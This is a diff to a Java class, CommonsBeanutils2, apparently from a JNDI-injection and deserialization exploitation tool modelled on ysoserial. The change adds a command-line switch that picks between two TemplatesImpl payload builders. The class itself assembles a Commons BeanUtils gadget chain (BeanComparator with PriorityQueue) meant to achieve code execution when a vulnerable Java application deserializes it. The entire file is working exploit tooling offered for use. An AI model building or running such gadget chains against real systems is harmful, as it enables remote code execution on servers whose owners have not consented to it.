@@ -3,10 +3,13 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.util.PriorityQueue;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * 	Gadget chain:
@@ -23,7 +26,12 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object         template  = Gadgets.createTemplatesImpl(type, param);
+        final Object template;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            template = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            template = Gadgets.createTemplatesImpl(type, param);
+        }
         final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
